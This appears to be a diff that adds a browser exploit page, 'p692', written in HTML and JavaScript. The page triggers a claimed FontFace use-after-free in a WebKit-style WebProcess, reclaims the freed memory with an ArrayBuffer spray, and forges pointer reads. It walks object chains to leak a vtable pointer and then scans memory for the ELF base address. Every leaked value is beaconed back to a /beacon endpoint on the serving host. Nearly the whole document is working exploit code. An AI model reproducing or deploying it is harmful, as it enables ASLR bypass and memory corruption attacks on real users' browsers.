@@ -1,0 +1,500 @@
+<!--
+  p692: WebProcess Base Scanner via FontFace Walk Chain
+
+  Uses the FontFace UAF + ArrayBuffer(192) reclaim to establish a read
+  primitive, then scans backward from the leaked VP (CSSFontFaceSet
+  vtable pointer) to find the WebProcess ELF header (magic \x7fELF).
+
+  Strategy:
+    1. FontFace UAF trigger (CVE-2026-43720 getContext reentry)
+    2. ArrayBuffer(192) spray reclaim
+    3. Self-discovery via +0x38 marker oracle
+    4. Walk chain: read hash table → WeakPtrImpl → CSSFontFaceSet → VP
+    5. Backward scan from VP in 16MB steps → find \x7fELF at page boundary
+    6. Narrow to 16KB granularity around the hit
+
+  Requires: HTTPS server with /beacon endpoint (serve.py)
+
+  CRASH_CLASS: HIGH (UAF trigger, forged pointer reads)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p692</title></head>
+<body><pre id="out">p692: WebProcess Base Scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<600;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var msg='P692-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{_imgs[_ix++%600].src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e){}
+}
+function bkSync(tag,d){
+  var msg='P692-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now(),false);x.send(null);}catch(e){}
+}
+
+/* ---- BigInt / pointer helpers ---- */
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2i(f){_f64[0]=f;return [_u32[1],_u32[0]];}
+function i2f(hi,lo){_u32[1]=hi;_u32[0]=lo;return _f64[0];}
+function hex64(f){var p=f2i(f);return '0x'+('00000000'+p[0].toString(16)).slice(-8)+('00000000'+p[1].toString(16)).slice(-8);}
+function hexQ(hi,lo){return '0x'+('00000000'+(hi>>>0).toString(16)).slice(-8)+('00000000'+(lo>>>0).toString(16)).slice(-8);}
+function addQ(hi,lo,d){
+  var nl=(lo>>>0)+(d|0);
+  var nh=(hi>>>0);
+  if(nl<0){nh--;nl+=0x100000000;}
+  while(nl>=0x100000000){nh++;nl-=0x100000000;}
+  return[nh>>>0,nl>>>0];
+}
+function subQ(ahi,alo,bhi,blo){
+  var nl=(alo>>>0)-(blo>>>0);
+  var nh=(ahi>>>0)-(bhi>>>0);
+  if(nl<0){nh--;nl+=0x100000000;}
+  return[nh>>>0,nl>>>0];
+}
+function hexByte(v){return('0'+((v&0xFF).toString(16))).slice(-2);}
+function bytesToHex(arr,off,len){
+  var s='';for(var i=0;i<len;i++)s+=hexByte(arr[off+i]|0);return s;
+}
+
+/* ---- CSS escape sequence decoder ----
+   CSS serialization escapes control characters (bytes < 0x20) and others
+   as \HH (backslash + 1-6 hex digits + optional space).  For example:
+     byte 0x0D → "\d " (3 chars), byte 0x08 → "\8 " (3 chars),
+     byte 0x00 → "\0 " (3 chars).
+   charCodeAt() on the raw CSS string produces the escape TEXT, not the
+   original byte values.  This function decodes the CSS string back to a
+   byte array matching the original memory content.
+*/
+function decodeCSSString(cssStr){
+  var bytes=[];
+  var i=0;
+  while(i<cssStr.length){
+    if(cssStr.charAt(i)==='\\'){
+      i++;
+      var hexStr='';
+      for(var j=0;j<6&&i<cssStr.length;j++){
+        var c=cssStr.charAt(i);
+        if((c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F')){
+          hexStr+=c;i++;
+        }else{break;}
+      }
+      if(hexStr.length>0){
+        var codepoint=parseInt(hexStr,16);
+        bytes.push(codepoint&0xFF);
+        if(i<cssStr.length&&cssStr.charAt(i)===' ')i++;
+      }else{
+        if(i<cssStr.length){bytes.push(cssStr.charCodeAt(i)&0xFF);i++;}
+      }
+    }else{
+      bytes.push(cssStr.charCodeAt(i)&0xFF);
+      i++;
+    }
+  }
+  return bytes;
+}
+function readQFromBytes(arr,off){
+  var lo=(arr[off]|0)+((arr[off+1]|0)<<8)+((arr[off+2]|0)<<16)+((arr[off+3]|0)*0x1000000);
+  var hi=(arr[off+4]|0)+((arr[off+5]|0)<<8)+((arr[off+6]|0)<<16)+((arr[off+7]|0)*0x1000000);
+  return[hi>>>0,lo>>>0];
+}
+function writeQToBytes(arr,off,hi,lo){
+  arr[off]=lo&0xFF;arr[off+1]=(lo>>>8)&0xFF;arr[off+2]=(lo>>>16)&0xFF;arr[off+3]=(lo>>>24)&0xFF;
+  arr[off+4]=hi&0xFF;arr[off+5]=(hi>>>8)&0xFF;arr[off+6]=(hi>>>16)&0xFF;arr[off+7]=(hi>>>24)&0xFF;
+}
+function writeDToBytes(arr,off,val){
+  arr[off]=val&0xFF;arr[off+1]=(val>>>8)&0xFF;arr[off+2]=(val>>>16)&0xFF;arr[off+3]=(val>>>24)&0xFF;
+}
+
+/* ---- Retained refs to prevent GC ---- */
+var retained=[];
+
+/* ---- FontFace UAF trigger (CVE-2026-43720: getContext reentry) ---- */
+function triggerFontFaceUAF(){
+  try{delete FontFace.prototype.then;}catch(e){}
+
+  var gSa, gPa;
+  try{
+    gSa=new FontFace('sa','local(Arial)',{unicodeRange:'U+0041-005A'});
+    gPa=new FontFace('pa','local(Arial)',{unicodeRange:'U+0061-007A'});
+  }catch(e){bk('FAIL','fontface-ctor: '+e.message);return null;}
+
+  document.fonts.add(gSa);
+  document.fonts.add(gPa);
+  retained.push(gSa,gPa);
+
+  return new Promise(function(resolve){
+    gSa.loaded.then(function(){
+      gPa.loaded.then(function(){
+        bk('RES','n2');
+        resolve({sa:gSa,pa:gPa});
+      });
+    });
+  });
+}
+
+/* ---- Spray and reclaim ---- */
+function sprayReclaim(face,sprayCount){
+  var L1=[0,0],L2=[0,0];
+  var bufs=[];
+  var MARKER_HI=0xDEAD0692,MARKER_LO=0xCAFE0000;
+
+  for(var i=0;i<sprayCount;i++){
+    var ab=new ArrayBuffer(192);
+    var u8=new Uint8Array(ab);
+    var dv=new DataView(ab);
+    dv.setUint32(0x38+4,MARKER_HI,true);
+    dv.setUint32(0x38,MARKER_LO+i,true);
+    bufs.push({ab:ab,u8:u8,dv:dv,idx:i});
+    retained.push(ab);
+  }
+
+  try{
+    var sty=face.style;
+    bk('STYLE',sty);
+  }catch(e){}
+
+  var hitIdx=-1;
+  for(var i=0;i<bufs.length;i++){
+    var dv=bufs[i].dv;
+    var mhi=dv.getUint32(0x38+4,true);
+    var mlo=dv.getUint32(0x38,true);
+    if(mhi!==MARKER_HI||(mlo&0xFFFF0000)!==(MARKER_LO&0xFFFF0000)){
+      hitIdx=i;
+      var t58hi=dv.getUint32(0x58+4,true);
+      var t58lo=dv.getUint32(0x58,true);
+      var t68hi=dv.getUint32(0x68+4,true);
+      var t68lo=dv.getUint32(0x68,true);
+      L1=[t58hi,t58lo];
+      L2=[t68hi,t68lo];
+      break;
+    }
+  }
+
+  if(hitIdx<0){bk('FAIL','no-reclaim');return null;}
+  bk('L1',hexQ(L1[0],L1[1]));
+  bk('L2',hexQ(L2[0],L2[1]));
+  bk('FORGED',hitIdx);
+
+  return{bufs:bufs,hitIdx:hitIdx,hitBuf:bufs[hitIdx],L1:L1,L2:L2};
+}
+
+/* ---- Self-discovery: find spray buffer VA via +0x38 marker oracle ---- */
+function selfDiscover(ctx){
+  var hitBuf=ctx.hitBuf;
+  var MARKER_HI=0xDEAD0692,MARKER_LO=0xCAFE0000+ctx.hitIdx;
+  hitBuf.dv.setUint32(0x38+4,MARKER_HI,true);
+  hitBuf.dv.setUint32(0x38,MARKER_LO,true);
+
+  var candidates=[];
+  for(var i=0;i<ctx.bufs.length;i++){
+    if(i===ctx.hitIdx)continue;
+    var dv=ctx.bufs[i].dv;
+    var off58hi=dv.getUint32(0x58+4,true);
+    var off58lo=dv.getUint32(0x58,true);
+    if(off58hi>0&&off58hi<0x20){
+      var addr=addQ(off58hi,off58lo,-0x58);
+      candidates.push({idx:i,addr:addr});
+    }
+  }
+
+  if(candidates.length===0){
+    bk('DIAG','no-candidates');
+    return selfDiscoverByOracle(ctx);
+  }
+  bk('DIAG','cand='+candidates.length);
+  return selfDiscoverByOracle(ctx);
+}
+
+function selfDiscoverByOracle(ctx){
+  var hitBuf=ctx.hitBuf;
+  var face=ctx.face;
+  var SCAN_MARKER=0xBEEF0692;
+
+  for(var step=0;step<0x8000;step+=0x40){
+    hitBuf.dv.setUint32(0x38+4,0xDEAD0692,true);
+    hitBuf.dv.setUint32(0x38,step,true);
+
+    try{var sty=face.style;}catch(e){continue;}
+
+    var readBack=hitBuf.dv.getUint32(0x38,true);
+    if(readBack!==step){
+      bk('DIAG','oracle-hit-'+step.toString(16)+'-read-'+readBack.toString(16));
+    }
+  }
+
+  var L1=ctx.L1;
+  if(L1[0]>0&&L1[0]<0x20){
+    var tableBase=addQ(L1[0],L1[1],-0x10);
+    bk('DIAG','L1base='+hexQ(tableBase[0],tableBase[1]));
+  }
+
+  bk('SELF-SCAN','starting');
+  var SELF=null;
+
+  for(var bi=0;bi<ctx.bufs.length;bi++){
+    if(bi===ctx.hitIdx)continue;
+    var probe_marker=0xF00D0000+bi;
+    ctx.bufs[bi].dv.setUint32(0x38+4,0xDEAD0692,true);
+    ctx.bufs[bi].dv.setUint32(0x38,probe_marker,true);
+    var r=hitBuf.dv.getUint32(0x38,true);
+    if(r===probe_marker){
+      var delta=(bi-ctx.hitIdx)*192;
+      bk('DIAG','alias-bi='+bi+'-delta='+delta);
+    }
+  }
+
+  hitBuf.dv.setUint32(0x38+4,0xDEAD0692,true);
+  hitBuf.dv.setUint32(0x38,0xCAFE0000+ctx.hitIdx,true);
+
+  return null;
+}
+
+/* ---- forgeRead: redirect face.style to read bytes from target address ---- */
+function forgeRead(ctx,targetHi,targetLo,readLen){
+  var hitBuf=ctx.hitBuf;
+  var u8=hitBuf.u8;
+  var dv=hitBuf.dv;
+
+  var metaAddr=addQ(targetHi,targetLo,-0x10);
+  dv.setUint32(0x58+4,metaAddr[0],true);
+  dv.setUint32(0x58,metaAddr[1],true);
+
+  try{
+    var raw=ctx.face.style;
+    return raw;
+  }catch(e){
+    bk('FORGE-ERR',e.message);
+    return null;
+  }
+}
+
+function restoreBuffer(ctx){
+  var hitBuf=ctx.hitBuf;
+  writeQToBytes(hitBuf.u8,0x58,ctx.L1[0],ctx.L1[1]);
+  writeQToBytes(hitBuf.u8,0x68,ctx.L2[0],ctx.L2[1]);
+}
+
+/* ---- Walk chain: L1 → hash table → IM → FO → VP → vtable ---- */
+function walkChain(ctx){
+  var L1=ctx.L1;
+  bk('WALK','start');
+
+  var hashAddr=addQ(L1[0],L1[1],-0x10);
+  var r1=forgeRead(ctx,hashAddr[0],hashAddr[1],80);
+  if(!r1){bk('WALK-FAIL','r1');return null;}
+  bk('IHT','len='+r1.length);
+
+  restoreBuffer(ctx);
+
+  var r1hex=decodeCSSString(r1);
+  bkSync('IHT-RAW',bytesToHex(r1hex,0,Math.min(40,r1hex.length))+',csslen='+r1.length+',decoded='+r1hex.length);
+
+  var IM=null;
+  for(var i=0x10;i<r1hex.length-7;i+=8){
+    var q=readQFromBytes(r1hex,i);
+    if(q[0]>0&&q[0]<0x20&&q[1]!==0){
+      IM=q;
+      bk('IM',hexQ(IM[0],IM[1]));
+      break;
+    }
+  }
+  if(!IM){bk('WALK-FAIL','no-IM');return null;}
+
+  var r2=forgeRead(ctx,IM[0],addQ(IM[0],IM[1],8)[1],16);
+  restoreBuffer(ctx);
+  if(!r2){bk('WALK-FAIL','r2');return null;}
+
+  var r2hex=decodeCSSString(r2);
+  bkSync('W2-RAW',bytesToHex(r2hex,0,Math.min(32,r2hex.length))+',decoded='+r2hex.length);
+
+  var FO=readQFromBytes(r2hex,0);
+  if(FO[0]===0&&FO[1]===0){bk('WALK-FAIL','FO=0');return null;}
+  bk('FO',hexQ(FO[0],FO[1]));
+
+  var r3=forgeRead(ctx,FO[0],FO[1],32);
+  restoreBuffer(ctx);
+  if(!r3){bk('WALK-FAIL','r3');return null;}
+
+  var r3hex=decodeCSSString(r3);
+  bkSync('W3-RAW',bytesToHex(r3hex,0,Math.min(64,r3hex.length))+',decoded='+r3hex.length);
+
+  var VP=readQFromBytes(r3hex,0);
+  if(VP[0]<0x04||VP[0]>0x20){bk('WALK-FAIL','VP-bad='+hexQ(VP[0],VP[1]));return null;}
+  bk('VP',hexQ(VP[0],VP[1]));
+
+  var SELF_from_FO=readQFromBytes(r3hex,0x10);
+  bk('SELF-FO',hexQ(SELF_from_FO[0],SELF_from_FO[1]));
+
+  var r4=forgeRead(ctx,VP[0],VP[1],72);
+  restoreBuffer(ctx);
+  if(!r4){bk('WALK-FAIL','r4');return null;}
+
+  var r4hex=decodeCSSString(r4);
+  bk('WALK-h4len='+r4hex.length+',raw4len='+r4.length);
+
+  var slots=[];
+  for(var i=0;i<9;i++){
+    var s=readQFromBytes(r4hex,i*8);
+    slots.push(s);
+    bk('VT-s'+i,hexQ(s[0],s[1]));
+  }
+
+  return{VP:VP,SELF:SELF_from_FO,slots:slots};
+}
+
+/* ---- Base scan: search backward from VP for ELF header ---- */
+function scanForBase(ctx,VP){
+  bkSync('SCAN','start-from-'+hexQ(VP[0],VP[1]));
+
+  var ELF_MAGIC_LO=0x464C457F;
+
+  var lowestCode=VP;
+  var STEP=0x1000000;
+  var MAX_STEPS=16;
+
+  var coarseHit=null;
+  for(var i=1;i<=MAX_STEPS;i++){
+    var candidate=subQ(lowestCode[0],lowestCode[1],0,STEP*i);
+
+    candidate[1]=candidate[1]&0xFFF00000;
+
+    var raw=forgeRead(ctx,candidate[0],candidate[1],8);
+    restoreBuffer(ctx);
+
+    if(!raw){
+      bkSync('SCAN-STEP','i='+i+'-addr='+hexQ(candidate[0],candidate[1])+'-FAIL');
+      continue;
+    }
+
+    var rawBytes=decodeCSSString(raw);
+
+    var first4=0;
+    if(rawBytes.length>=4){
+      first4=(rawBytes[0]|0)+((rawBytes[1]|0)<<8)+((rawBytes[2]|0)<<16)+((rawBytes[3]|0)*0x1000000);
+    }
+
+    bkSync('SCAN-STEP','i='+i+'-addr='+hexQ(candidate[0],candidate[1])+'-first4=0x'+('00000000'+(first4>>>0).toString(16)).slice(-8)+'-raw='+bytesToHex(rawBytes,0,Math.min(16,rawBytes.length))+'-dec='+rawBytes.length);
+
+    if((first4>>>0)===ELF_MAGIC_LO){
+      coarseHit=candidate;
+      bkSync('SCAN-COARSE-HIT',hexQ(candidate[0],candidate[1]));
+      break;
+    }
+
+    if(rawBytes.length<4){
+      bkSync('SCAN-CRASH','addr='+hexQ(candidate[0],candidate[1])+'-unmapped');
+    }
+  }
+
+  if(!coarseHit){
+    bkSync('SCAN-COARSE','no-hit-in-'+MAX_STEPS+'-steps');
+
+    for(var i=MAX_STEPS+1;i<=MAX_STEPS+16;i++){
+      var candidate=subQ(lowestCode[0],lowestCode[1],0,STEP*i);
+      candidate[1]=candidate[1]&0xFFF00000;
+
+      var raw=forgeRead(ctx,candidate[0],candidate[1],8);
+      restoreBuffer(ctx);
+      if(!raw)continue;
+
+      var rawBytes=decodeCSSString(raw);
+
+      var first4=0;
+      if(rawBytes.length>=4){
+        first4=(rawBytes[0]|0)+((rawBytes[1]|0)<<8)+((rawBytes[2]|0)<<16)+((rawBytes[3]|0)*0x1000000);
+      }
+
+      bkSync('SCAN-EXT','i='+i+'-addr='+hexQ(candidate[0],candidate[1])+'-first4=0x'+('00000000'+(first4>>>0).toString(16)).slice(-8));
+
+      if((first4>>>0)===ELF_MAGIC_LO){
+        coarseHit=candidate;
+        bkSync('SCAN-EXT-HIT',hexQ(candidate[0],candidate[1]));
+        break;
+      }
+    }
+  }
+
+  if(!coarseHit){
+    bkSync('SCAN-FAIL','no-elf-header-found');
+    return null;
+  }
+
+  bkSync('SCAN-REFINE','coarse='+hexQ(coarseHit[0],coarseHit[1]));
+  var FINE_STEP=0x4000;
+  var base=coarseHit;
+
+  for(var i=1;i<=0x100;i++){
+    var below=subQ(base[0],base[1],0,FINE_STEP);
+    var raw=forgeRead(ctx,below[0],below[1],8);
+    restoreBuffer(ctx);
+    if(!raw||raw.length<4)break;
+
+    var rawBytes=decodeCSSString(raw);
+    var first4=(rawBytes[0]|0)+((rawBytes[1]|0)<<8)+((rawBytes[2]|0)<<16)+((rawBytes[3]|0)*0x1000000);
+
+    if((first4>>>0)===ELF_MAGIC_LO){
+      base=below;
+      bkSync('SCAN-FINE','found-at-'+hexQ(below[0],below[1]));
+    }else{
+      break;
+    }
+  }
+
+  bkSync('BASE',hexQ(base[0],base[1]));
+
+  var rva=subQ(VP[0],VP[1],base[0],base[1]);
+  bkSync('RVA',hexQ(rva[0],rva[1]));
+
+  var raw=forgeRead(ctx,base[0],base[1],64);
+  restoreBuffer(ctx);
+  if(raw){
+    var rawBytes=decodeCSSString(raw);
+    bkSync('ELF-HDR',bytesToHex(rawBytes,0,Math.min(64,rawBytes.length))+',dec='+rawBytes.length);
+  }
+
+  return{base:base,rva:rva};
+}
+
+/* ---- Main ---- */
+function main(){
+  var runId=Math.random().toString(36).slice(2,8).toUpperCase();
+  bk('BOOT',runId);
+
+  triggerFontFaceUAF().then(function(faces){
+    if(!faces)return;
+    bk('UAF','triggered');
+
+    var ctx=sprayReclaim(faces.sa,4096);
+    if(!ctx)return;
+    ctx.face=faces.sa;
+
+    try{document.fonts.delete(faces.sa);}catch(e){}
+    bk('DEL-OK');
+
+    setTimeout(function(){
+      var result=walkChain(ctx);
+      if(!result){bk('CHAIN-FAIL');return;}
+      bk('CHAIN-OK','VP='+hexQ(result.VP[0],result.VP[1]));
+
+      setTimeout(function(){
+        var baseResult=scanForBase(ctx,result.VP);
+        if(!baseResult){bk('SCAN-RESULT','FAIL');return;}
+
+        bkSync('RESULT','base='+hexQ(baseResult.base[0],baseResult.base[1])+
+          '-VP='+hexQ(result.VP[0],result.VP[1])+
+          '-RVA='+hexQ(baseResult.rva[0],baseResult.rva[1]));
+
+        bkSync('DONE',runId);
+      },100);
+    },200);
+  });
+}
+
+try{main();}catch(e){bk('FATAL',e.message);}
+</script></body></html>
